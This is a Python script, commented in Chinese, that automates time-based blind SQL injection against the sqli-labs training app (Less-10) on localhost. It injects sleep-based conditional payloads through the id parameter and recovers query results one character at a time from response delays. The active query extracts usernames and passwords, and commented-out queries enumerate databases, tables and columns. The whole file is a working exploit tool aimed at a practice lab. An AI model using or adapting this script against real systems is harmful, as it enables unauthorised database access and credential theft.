import sys
import time
import requests


def getPayload(result_index, char_index, ascii):
    # 附加url
    start_str = '1" and '
    end_str = "--+"
    # 自定义SQL查询语句
    # 查询所有数据库名
    # select_str="select schema_name from information_schema.schemata limit "+ str(result_index) + ",1"
    # 查询特定数据库中的所有表名
    # select_str="select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+",1"
    # 查询数据库的表的列名
    # select_str= "select column_name from information_schema.columns where table_name ='users' and table_schema='security' limit " + str(result_index) + ",1"
    # 查询特定数据库特定表中内容
    select_str = "select concat(username,0x7e,password) from users limit " + str(result_index) + ",1"
    # 连接payload
    sqli_str = "if(ascii(mid((" + select_str + ")," + str(char_index) + ",1))=" + str(ascii) + ",sleep(0.1),0)"

    payload = start_str + sqli_str + end_str
    # print(payload)
    return payload


def execute(result_index, char_index, ascii):
    # 连接url
    url = "http://localhost/sqli-labs/Less-10/?id="
    exec_url = url + getPayload(result_index, char_index, ascii)
    # print(exec_url)
    # 检查延时
    before_time = time.time()
    requests.get(exec_url)  # 节约时间
    after_time = time.time()
    use_time = after_time - before_time
    if use_time >= 0.1:
        return True
    else:
        return False


def exhaustive(result_index, char_index):
    # ascii可显字符从32到126共95个 按可能性顺序
    ascii_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                  'u', 'v', 'w', 'x', 'y', 'z', '_', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
                  'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '"', '#', '$', '%', '&',
                  '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':',
                  ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '`', '{', '|', '}', '~']
    for ascii_char in ascii_list:
        ascii = ord(ascii_char)
        if execute(str(result_index), str(char_index + 1), str(ascii)):
            return ascii_char
    return chr(1)


if __name__ == "__main__":
    for num in range(32):  # 查询结果的数量
        count = 0
        for len in range(32):  # 单条查询结果的长度
            count += 1
            char = exhaustive(num, len)
            if ord(char) == 1:  # 单条查询结果已被遍历
                break
            sys.stdout.write(char)
            sys.stdout.flush()
        if count == 1:  # 查询结果已被遍历
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()
